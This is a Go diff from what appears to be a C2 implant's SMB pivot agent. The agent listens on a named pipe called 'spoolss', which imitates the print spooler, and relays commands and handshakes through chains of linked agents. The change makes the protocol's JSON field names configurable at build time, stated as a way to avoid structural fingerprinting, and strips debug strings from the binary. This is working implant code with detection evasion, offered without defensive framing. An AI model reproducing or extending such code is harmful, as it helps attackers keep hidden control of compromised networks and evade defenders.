@@ -45,12 +45,19 @@ var (
 	// Pipe name for the named pipe listener
 	pipeName = "spoolss"
 
-	// Debug mode
-	debugMode = "false"
-
 	// SMB pipe transforms - embedded at build time, XOR encrypted with xorKey
 	// When empty, no transforms are applied (legacy mode)
 	smbDataTransforms = ""
+
+	// Malleable link field names - injected at build time via ldflags
+	// These can be customized in config.toml to avoid structural fingerprinting
+	MALLEABLE_LINK_DATA_FIELD           = "ld"
+	MALLEABLE_LINK_COMMANDS_FIELD       = "lc"
+	MALLEABLE_LINK_HANDSHAKE_FIELD      = "lh"
+	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = "lr"
+	MALLEABLE_LINK_UNLINK_FIELD         = "lu"
+	MALLEABLE_ROUTING_ID_FIELD          = "r"
+	MALLEABLE_PAYLOAD_FIELD             = "p"
 )
 
 // Parsed SMB transforms - initialized on first use
@@ -243,14 +250,14 @@ func handleServerData(conn *PipeConnection, encryptedPayload string) {
 		// New format - may have commands and/or link data
 
 		// Process handshake responses for child agents FIRST (before commands)
-		if linkRespVal, ok := payloadData["lr"]; ok {
+		if linkRespVal, ok := payloadData[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
 			if linkRespData, ok := linkRespVal.([]interface{}); ok {
 				processLinkHandshakeResponses(linkRespData)
 			}
 		}
 
 		// Process link commands for child agents (forward to linked SMB agents)
-		if linkCmdsVal, ok := payloadData["lc"]; ok {
+		if linkCmdsVal, ok := payloadData[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
 			if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
 				processLinkCommands(linkCmdsData)
 			}
@@ -303,17 +310,17 @@ func handleServerData(conn *PipeConnection, encryptedPayload string) {
 
 		// Include link data from child agents (to be forwarded up the chain)
 		if hasLinkData {
-			payload["ld"] = linkData
+			payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
 		}
 
-		// Include link handshake from child agents (via "lh" field)
+		// Include link handshake from child agents
 		if hasLinkHandshake {
-			payload["lh"] = linkHandshake
+			payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.ToMalleableMap()
 		}
 
 		// Include unlink notifications from child agents
 		if hasUnlinkNotifications {
-			payload["lu"] = unlinkNotifications
+			payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
 		}
 
 		jsonData, err := json.Marshal(payload)
@@ -382,42 +389,35 @@ func handleHandshakeResponse(conn *PipeConnection, rawMessage []byte) {
 	// For the SMB agent's own handshake, performHandshake handles it directly
 	// But this function is called from the message loop for forwarded responses
 
-	// Check if there's an "lr" field for grandchildren that needs forwarding
-	var msg struct {
-		Type    string        `json:"type"`
-		Payload string        `json:"payload"`
-		LR      []interface{} `json:"lr"`
-	}
-
-	if err := json.Unmarshal(rawMessage, &msg); err != nil {
+	// Parse into map to support configurable field names
+	var msgMap map[string]interface{}
+	if err := json.Unmarshal(rawMessage, &msgMap); err != nil {
 		return
 	}
 
-	// If there's lr data, forward to our children
-	if len(msg.LR) > 0 {
-		processLinkHandshakeResponses(msg.LR)
+	// If there's lr data, forward to our children using configurable field name
+	if lrData, ok := msgMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD].([]interface{}); ok && len(lrData) > 0 {
+		processLinkHandshakeResponses(lrData)
 	}
 }
 
 // handleLinkHandshakeResponse handles forwarded handshake responses from parent
 // This is used when a grandchild agent's handshake response needs to pass through us
 func handleLinkHandshakeResponse(rawMessage []byte) {
-	// Parse the message to extract the lr field
-	var msg struct {
-		Type string        `json:"type"`
-		LR   []interface{} `json:"lr"`
-	}
-
-	if err := json.Unmarshal(rawMessage, &msg); err != nil {
+	// Parse into map to support configurable field names
+	var msgMap map[string]interface{}
+	if err := json.Unmarshal(rawMessage, &msgMap); err != nil {
 		return
 	}
 
-	if len(msg.LR) == 0 {
+	// Extract handshake responses using configurable field name
+	lrData, ok := msgMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD].([]interface{})
+	if !ok || len(lrData) == 0 {
 		return
 	}
 
 	// Process the lr data - forward to our children
-	processLinkHandshakeResponses(msg.LR)
+	processLinkHandshakeResponses(lrData)
 }
 
 // logDebug removed to eliminate debug strings from binary
@@ -438,8 +438,8 @@ func processLinkCommands(linkCmds []interface{}) {
 			continue
 		}
 
-		routingID, _ := cmdMap["r"].(string)
-		payload, _ := cmdMap["p"].(string)
+		routingID, _ := cmdMap[MALLEABLE_ROUTING_ID_FIELD].(string)
+		payload, _ := cmdMap[MALLEABLE_PAYLOAD_FIELD].(string)
 		// Check if payload has transforms applied by server (t=true means raw bytes after base64 decode)
 		transformed, _ := cmdMap["t"].(bool)
 
@@ -478,8 +478,8 @@ func processLinkHandshakeResponses(linkResps []interface{}) {
 			continue
 		}
 
-		routingID, _ := respMap["r"].(string)
-		payload, _ := respMap["p"].(string)
+		routingID, _ := respMap[MALLEABLE_ROUTING_ID_FIELD].(string)
+		payload, _ := respMap[MALLEABLE_PAYLOAD_FIELD].(string)
 
 		if routingID == "" || payload == "" {
 			continue
@@ -494,9 +494,9 @@ func processLinkHandshakeResponses(linkResps []interface{}) {
 		// Send handshake_response to the child
 		// Include the full lr data so the child can forward to grandchildren if needed
 		message := map[string]interface{}{
-			"type":    "handshake_response",
-			"payload": payload,
-			"lr":      []interface{}{respMap}, // Include lr for forwarding to grandchildren
+			"type":                                "handshake_response",
+			"payload":                             payload,
+			MALLEABLE_LINK_HANDSHAKE_RESP_FIELD:   []interface{}{respMap}, // Include lr for forwarding to grandchildren
 		}
 
 		msgJSON, err := json.Marshal(message)
